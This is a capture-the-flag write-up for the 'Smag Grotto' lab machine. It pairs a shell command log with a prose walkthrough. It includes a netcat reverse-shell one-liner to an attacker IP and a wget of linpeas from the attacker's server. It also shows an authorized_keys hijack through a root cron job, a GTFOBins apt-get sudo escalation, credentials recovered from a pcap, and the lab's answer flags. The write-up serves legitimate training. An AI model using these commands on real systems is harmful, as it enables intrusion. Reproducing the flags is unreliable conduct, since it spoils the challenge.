# Smag Grotto - Easy

```shell
rustscan -a 10.10.45.39 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.45.39 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

sudo vim /etc/hosts
#add development.smag.thm\

nc -lvnp 5555
#execute reverse-shell command on /admin.php

python3 -c 'import pty;pty.spawn("/bin/bash")'

ls /home

cd /home/jake

cd /tmp

#get linpeas.sh from attacker machine with server
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

cat /etc/crontab

cat /opt/.backups/jake_id_rsa.pub.backup

#in our machine
ssh-keygen
#generate public/private rsa key pair

cd .ssh

cat id_rsa.pub
#copy the public key output
#paste it into the file we found earlier

echo "ssh-rsa ... PUBLIC KEY ... " > /opt/.backups/jake_id_rsa.pub.backup

#on our machine
ssh jake@10.10.45.39 -i .ssh/id_rsa

sudo -l
#we can run apt-get as sudo

#exploit from GTFObins
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

#we get root
cat /root/root.txt
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2
  * 80 - http - Apache httpd 2.4.18 (Ubuntu)

Using Gobuster, we enumerate the web directories and find a directory named /mail.

The /mail directory includes 3 emails and a .pcap file; we can open the .pcap file in Wireshark and analyze.

Now, the .pcap file is very small and we can go through each entry manually.

Under HTTP, one of the entries include a POST request to /login.php in development.smag.thm which includes the credentials entered - helpdesk:cH4nG3M3_n0w

So, we need to edit our /etc/hosts file and map development.smag.thm to the machine IP.

Now, if we visit <http://development.smag.thm>, we get /admin.php, /login.php and a CSS file.

As we are not logged in, /admin.php redirects to /login.php; we can anyways login with the creds we found earlier.

Logging in leads us to /admin.php, and we can enter a command now.

We can use any one-liner reverse-shell; I used this from an online reverse shell generator:

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.31.212 5555 >/tmp/f

After setting up a listener, if we execute the above command, we get a reverse shell as www-data.

We can navigate to jake's home directory but we cannot read user.txt, for now.

For privesc, we can use linpeas.sh as a guide.

linpeas shows that there is a cronjob run every minute by root, the command is:

    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys

Further, we have write permissions for /opt/.backups/jake_id_rsa.pub.backup; so we can add our public key to this file so that it goes into jake's authorized keys, making it easier for us to login.

A minute after we edit the backup file with our public key, we can SSH as jake on our machine, without any password.

After reading user.txt, we can check for privesc vectors.

We can run /usr/bin/apt-get as sudo without password. Checking GTFObins, we have a few exploits for apt-get, so we can use that to get root.

Using the exploit, we get root.
```

1. What is the user flag? - iusGorV7EbmxM5AuIe2w499msaSuqU3j

2. What is the root flag? - uJr6zRgetaniyHVRqqL58uRasybBKz2T
